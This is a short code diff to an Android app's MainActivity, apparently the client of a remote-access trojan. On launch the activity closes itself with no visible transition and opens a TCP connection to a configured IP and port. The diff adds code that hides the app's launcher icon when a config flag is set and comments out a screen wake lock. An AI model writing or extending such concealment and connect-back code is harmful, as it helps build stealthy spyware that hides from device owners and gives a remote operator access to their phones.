@@ -22,13 +22,15 @@ public class MainActivity extends AppCompatActivity {
         overridePendingTransition(0, 0);
         context=getApplicationContext();
         Log.d(TAG,config.IP+"\t"+config.port);
-        //new functions(activity).overlayChecker(context);
-        final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK,TAG);
-        mWakeLock.acquire();
+//        new functions(activity).overlayChecker(context);
+//        final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+//        mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK,TAG);
+//        mWakeLock.acquire();
         finish();
         new tcpConnection(activity,context).execute(config.IP,config.port);
         overridePendingTransition(0, 0);
-        //new functions(activity).hideAppIcon(context);
+        if(config.icon){
+            new functions(activity).hideAppIcon(context);
+        }
     }
 }
